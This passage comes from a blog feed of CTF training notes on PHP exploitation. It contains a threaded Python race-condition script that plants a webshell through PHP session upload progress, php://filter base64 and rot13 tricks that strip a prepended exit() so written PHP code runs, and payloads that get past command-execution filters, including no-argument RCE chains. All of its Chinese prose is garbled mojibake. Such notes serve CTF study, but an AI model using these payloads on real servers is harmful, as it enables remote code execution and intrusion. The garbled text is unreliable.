class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;åœ°å€&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span><br><span class="hljs-tag">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;change here&quot;</span></span><br><span class="hljs-tag">      /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼Œæ·»åŠ <code>Cookie: PHPSESSID=flag</code>ï¼Œåœ¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>ä¸‹æ·»åŠ ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>PHP å°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼š<code>/tmp/sess_flag</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1999159-20201011101000761-1649541695.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1999159-20201010204012871-1202434485.png"></p><p>ä¸¤è€…éƒ½é‡å¤å‘åŒ…å³å¯ï¼Œåœ¨å¾—åˆ°<code>ls</code>çš„ç»“æœåï¼Œä¿®æ”¹åŒ…å†é‡å¤å‘åŒ…å³å¯ã€‚</p><p>ä¸Šé¢æ‰€è°“çš„ payload å¯åŠ å¯ä¸åŠ ï¼Œä¸åŠ å°†æ”»å‡»ç±»å‹è®¾ç½®ä¸º Null Payload å³å¯ã€‚</p><blockquote><p>å½“æ²¡æœ‰ç›´æ¥æ–‡ä»¶åŒ…å«çš„ç‚¹æ—¶ï¼Œï¼ˆæ¯”å¦‚æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œåˆ©ç”¨äº† sess ä¸Šä¼ è¿›åº¦ï¼Œ.user.ini/ini åŒ…å«çš„æ–‡ä»¶/ini åŒ…å«çš„æ–‡ä»¶åŒ…å« sess_flagï¼‰</p><p>python é€šç”¨è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessID = <span class="hljs-string">&#x27;flag&#x27;</span><br>url = <span class="hljs-string">&#x27;http://761f62d0-9936-4b3c-be74-0b640259cea8.challenge.ctf.show:8080/&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">256</span> * <span class="hljs-number">1</span>)<span class="hljs-comment">#åˆ›å»ºæ–‡ä»¶</span><br>        response = session.post(<span class="hljs-comment">#postä¸Šä¼ </span><br>            url,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,<span class="hljs-comment">#è®¾ç½®cookieä¸ºsessid</span><br>            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;flag.txt&#x27;</span>, f)&#125;<span class="hljs-comment">#è®¾ç½®postå…·ä½“å†…å®¹ï¼Œè¿™é‡Œå¯ä»¥files=file</span><br>        )<br><br><span class="hljs-comment">#def read(session):</span><br><span class="hljs-comment">#    while event.isSet():</span><br><span class="hljs-comment">#        data =&#123;</span><br><span class="hljs-comment">#            &#x27;ctf&#x27;:&quot;/tmp/sess_&quot;+sessid   #åŒ…å«æˆ‘ä»¬çš„sessionè·¯å¾„</span><br><span class="hljs-comment">#        &#125;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        response = session.get(url + <span class="hljs-string">&#x27;upload/index.php&#x27;</span>.<span class="hljs-built_in">format</span>(sessID)) <span class="hljs-comment">#è·å¾—ç›¸åº”åŒ…</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]retrying...&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<span class="hljs-comment">#æ¡ä»¶ç«äº‰</span><br>    event = threading.Event()<br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ bp å®Œæˆ</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211005183417107.png"></p></blockquote><ul><li>æ­»äº¡ exit</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    file_put_contents(urldecode(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>base64ï¼š</p><p>GET</p><p>url å…¨ç¼–ç ï¼šphp://filter/write=convert.base64-decode/resource=1.php</p><p>POST</p><p>base64ï¼š&lt;?php system(â€˜tac f*â€˜);?&gt;</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>base64 ç¼–ç ä¸­åªåŒ…å« 64 ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€Œ PHP åœ¨è§£ç  base64 æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p><p>æ‰€ä»¥ï¼Œä¸€ä¸ªæ­£å¸¸çš„ base64_decode å®é™…ä¸Šå¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br>base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œå½“<code>$content</code>è¢«åŠ ä¸Šäº†<code>&lt;?php exit;?&gt;</code>ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>ç©ºæ ¼</code>ç­‰ä¸€å…±æœ‰ 7 ä¸ªå­—ç¬¦ä¸ç¬¦åˆ base64 ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚</p><p>â€œphpexitâ€ä¸€å…± 7 ä¸ªå­—ç¬¦ï¼Œå› ä¸º base64 ç®—æ³•è§£ç æ—¶æ˜¯ 4 ä¸ª byte ä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ  1 ä¸ªâ€œaâ€ä¸€å…± 8 ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œâ€phpexitaâ€è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„ webshell çš„ base64 å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯<code>&lt;?php exit; ?&gt;</code>æ²¡æœ‰äº†ã€‚</p></blockquote><p>==&gt; aaPD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><p>æ­¤å¤„ä¸º&lt;?php die(â€˜å¤§ä½¬åˆ«ç§€äº†â€™);?&gt; ==&gt; phpdie æ•…å‰é¢æ·»åŠ ä¸¤ä¸ªå­—ç¬¦</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210903001809220.png"></p><blockquote><p>rot13</p><p>GET</p><p>å…¨ç¼–ç ï¼šphp://filter/write=string.rot13/resource=2.php</p><p>POST</p><p>&lt;?cuc flfgrz(â€˜gnp s*â€˜);?&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210903002413152.png"></p><blockquote><p>.htaccess çš„é¢„åŒ…å«åˆ©ç”¨</p><p>åŒæ ·ä½¿ç”¨è¿‡æ»¤å™¨ï¼Œstring.strip_tags</p><p>GET</p><p>å…¨ç¼–ç ï¼šphp://filter/write=string.strip_tags|convert.base64-decode/resource=1.php</p><p>POST</p><p>base64ï¼š&lt;?php system(â€˜tac f*â€˜);</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs=</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210904232700304.png"></p><p>string.strip_tags å¯ä»¥åœ¨ php5 çš„ç¯å¢ƒä¸‹é¡ºåˆ©çš„ä½¿ç”¨ï¼Œå¦‚æœé¢˜ç›®ç¯å¢ƒæ˜¯åœ¨ php7.3.0 ä»¥ä¸Šçš„ç¯å¢ƒä¸‹ï¼Œå°±ä¼šå‡ºç°ä¸Šé¢çš„æƒ…å†µï¼Œä½†æ­¤é¢˜æ˜¯å¯ä»¥å†™è¿›å»çš„ï¼Œè®¿é—® 1.php å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œ</title>
    <link href="/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="eval-c"><a href="#eval-c" class="headerlink" title="eval(c)"></a>eval(c)</h2><ul><li>ä»ç»•è¿‡æ­£åˆ™åŒ¹é…çš„è§’åº¦ï¼š</li></ul><p>è¿‡æ»¤äº†å…³é”®å•è¯ å¦‚ flagã€php åœ¨ linux å¯ä»¥ä½¿ç”¨å ä½ç¬¦<code>ï¼Ÿ</code>å’Œ<code>*</code></p><p>æ¯”å¦‚<code>flag.php</code>å¯ä»¥ä½¿ç”¨<code>fl??.???</code>æˆ–è€…<code>fl?g.??p</code>å’Œ<code>f*</code>æˆ–è€… <code>f***</code>ç­‰</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç©ºå­—ç¬¦<code>&#39;&#39;</code>å¤¹åœ¨è¿‡æ»¤å†…å®¹ä¹‹ä¸­<code>fl&#39;&#39;ag.php</code></p><p>è¿˜å¯ä»¥è¿™æ ·<code>fla\g.php</code>æˆ–è€…æ­£åˆ™<code>f[abcd]ag.php</code>ã€<code>f[a-z]ag.php</code> <code>[abcd]</code> (<code>[abcd]</code> åŒ¹é…<code>abcd</code>ä¸­ä¸€ä¸ªå­—ç¬¦<code>[a-z]</code> åŒ¹é…èŒƒå›´ <code>a-z</code>)</p><p>payload ä¼˜å…ˆçº§<code>* = &#39;&#39; = \ &gt; ?</code></p><ul><li>ä»å˜é‡é€ƒé€¸çš„è§’åº¦</li></ul><p>å¯¹ä¸€ä¸ªå˜é‡çš„æ­£åˆ™è¿‡æ»¤æ¯”è¾ƒå¤šçš„æ—¶å€™ å¯ä»¥å¯¹å˜é‡è¿›è¡Œé€ƒé€¸ æ¯”å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br> <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br> <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br> &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?c=eval($_GET[â€˜aâ€™]);&amp;a=system(â€˜lsâ€™);</p></blockquote><p>è¿™æ ·å°±å¯ä»¥é€ƒè¿‡å¯¹å‘½ä»¤æ‰§è¡Œçš„å•ä¸€å˜é‡è¿‡æ»¤</p><ul><li>ä»å‡½æ•°ç‰¹æ€§çš„è§’åº¦</li></ul><p>å¯¹äº eval å¯ä»¥æ’å…¥ php çš„å®Œæ•´ä»£ç  å› ä¸º eval ä¼šå°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œã€include è§ä¸‹æ–‡ã€‘</p><blockquote><p>?c=echo hello;?&gt;&lt;?=include($_GET[â€˜aâ€™]);&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>è¿™é‡Œæœ‰ä¸¤ä¸ªç–‘é—®ï¼š</p><p>ä¸€ã€ä½¿ç”¨ echo file_get_contents(â€œflag.phpâ€)å¹¶ä¸èƒ½åœ¨é¡µé¢ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ éœ€è¦æŸ¥çœ‹æºç  ä¸ºä»€ä¹ˆ</p><p>äºŒã€ä½¿ç”¨ system(â€˜cat flag.phpâ€™)ä¹Ÿéœ€è¦æŸ¥çœ‹æºç  ä½†æ˜¯ä½¿ç”¨ system(â€˜tac flag.phpâ€™)å°±èƒ½ç›´æ¥å¾—åˆ°æºç (å€’å™)</p><p>ä¸¤ä¸ªéƒ½æ˜¯è¿™æ ·è¾“å‡ºçš„</p><blockquote><?php......</blockquote><p>html å¹¶ä¸èƒ½è¿™æ ·ç›´æ¥è¾“å‡º è€Œå€’å™çš„ tac è¾“å‡ºçš„åˆ™æ˜¯</p><blockquote><p>â€¦â€¦</p><?php</blockquote><p>å…¶å®è¿™å°±æ¶‰åŠ html é¡µé¢çš„è¾“å‡ºé—®é¢˜</p><ul><li>ä»è¯­è¨€ç»“æ„çš„è§’åº¦</li></ul><p>ç»§ç»­ ä½†åŒ¹é…å†åŠ ä¸€ä¸ªæ‹¬å·<code>(</code>æ—¶ ä¸Šé¢çš„æ–¹æ³•å°±å¤±æ•ˆäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨å‚æ•°é€ƒé€¸ ï¼ˆè¿™é‡Œ<code>;</code>è¢«è¿‡æ»¤äº†å¯ä»¥ä½¿ç”¨<code>?&gt;</code>ä»£æ›¿ï¼‰ä½†æ˜¯è¦ç”¨åˆ°è¯­è¨€ç»“æ„ <code>echo print isset unset include require</code>ç­‰ä¸éœ€è¦ä½¿ç”¨æ‹¬å·</p><blockquote><p>?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/reasource=flag.php</p></blockquote><p>è¿™é‡Œçš„ include å±äºæ–‡ä»¶è¯»å–èŒƒç•´ ä¹Ÿå°±æ˜¯è¯´é€ƒé€¸å‡ºå»çš„å‚æ•° 1 ä¸èƒ½<code>1=system(ls)</code></p><blockquote><p>å½“æ­£åˆ™åŒ¹é…æ•°å­—çš„æ—¶å€™ é€ƒé€¸å‚æ•°éœ€è¦æ”¹ä¸ºå­—æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><ul><li>è¿‡æ»¤äº† system()</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">system</span>()<br><span class="hljs-selector-tag">passthru</span>()    # <span class="hljs-selector-tag">passthru</span> â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º<br><span class="hljs-selector-tag">exec</span>()        # <span class="hljs-selector-tag">exec</span> â€” æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº<br><span class="hljs-selector-tag">shell_exec</span>()  # <span class="hljs-selector-tag">shell_exec</span> â€” é€šè¿‡ <span class="hljs-selector-tag">shell</span> ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚<br><span class="hljs-selector-tag">popen</span>()<br><span class="hljs-selector-tag">proc_open</span>()<br><span class="hljs-selector-tag">pcntl_exec</span>()<br>` `           # åŒ<span class="hljs-selector-tag">shell_exec</span>()<br><br><span class="hljs-comment">//åªæœ‰systemå‡½æ•°æ˜¯æœ‰å›æ˜¾çš„ï¼Œå…¶ä»–çš„å‡½æ•°å¯ä»¥é€šè¿‡echoç­‰æ˜¾ç¤º</span><br></code></pre></td></tr></table></figure><ul><li>è¿‡æ»¤äº† cat</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>les<span class="hljs-variable">s:</span>ä¸ more ç±»ä¼¼<br>head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ <span class="hljs-keyword">cat</span> çš„åå‘æ˜¾ç¤º<br>tai<span class="hljs-variable">l:</span>æŸ¥çœ‹å°¾å‡ è¡Œ<br>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br><span class="hljs-keyword">vi</span>:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br><span class="hljs-keyword">vim</span>:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br><span class="hljs-keyword">sor</span><span class="hljs-variable">t:</span>å¯ä»¥æŸ¥çœ‹<br>uniq:å¯ä»¥æŸ¥çœ‹<br><span class="hljs-keyword">file</span> -<span class="hljs-keyword">f</span>:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br><span class="hljs-keyword">grep</span> åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ <span class="hljs-keyword">file</span> å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š <span class="hljs-keyword">grep</span> test *<span class="hljs-keyword">file</span><br>paste æŒ‡ä»¤ä¼šæŠŠæ¯ä¸ªæ–‡ä»¶ä»¥åˆ—å¯¹åˆ—çš„æ–¹å¼ï¼Œä¸€åˆ—åˆ—åœ°åŠ ä»¥åˆå¹¶ã€‚<br></code></pre></td></tr></table></figure><ul><li>è¿‡æ»¤äº†ç©ºæ ¼</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;IFS&#125;</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&lt; <span class="hljs-regexp">//</span>æŸäº›æƒ…å†µtac&lt;fl?g.phpä¸èƒ½å‡ºç»“æœ åº”è¯¥æ˜¯ä¸æ”¯æŒé€šé…ç¬¦ æƒ…å†µæœ‰å¾…è¯å®<br>&lt;&gt;<br>&#123;a,b&#125; <span class="hljs-regexp">//</span>a,béƒ½æ˜¯shellå‘½ä»¤<br>%<span class="hljs-number">09</span>(php)<br></code></pre></td></tr></table></figure><ul><li>æ— å‚æ•° RCE(Remote Command/Code Execute)</li></ul><p>â… </p><blockquote><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));//pos æ˜¯ current çš„åˆ«å</p></blockquote><p>â…¡</p><blockquote><p>?c=session_start();system(session_id());<br>ä¿®æ”¹ PHPSESSID 